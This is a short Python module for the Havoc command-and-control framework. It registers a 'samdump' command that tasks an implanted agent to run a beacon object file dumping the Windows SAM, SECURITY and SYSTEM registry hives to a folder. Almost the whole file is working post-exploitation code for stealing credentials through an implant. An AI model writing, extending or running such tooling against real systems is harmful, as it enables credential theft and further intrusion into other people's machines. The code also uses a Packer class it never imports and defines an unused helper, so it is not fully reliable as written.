from havoc import Demon, RegisterCommand
import re
import time

# https://github.com/EncodeGroup/BOF-RegSave/tree/master

def is_full_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

def samdump(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()

    num_params = len(params)
    path = ''

    demon = Demon( demonID )

    if num_params != 1:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing the path" )
        return True

    path = params[ 0 ]

    packer.addstr(path)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to dump the SAM registry" )

    demon.InlineExecute( TaskID, "go", f"regdump.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( samdump, "", "samdump", "Dump the SAM, SECURITY and SYSTEM registries", 0, "<folder>", "C:\\Windows\\Temp\\" )
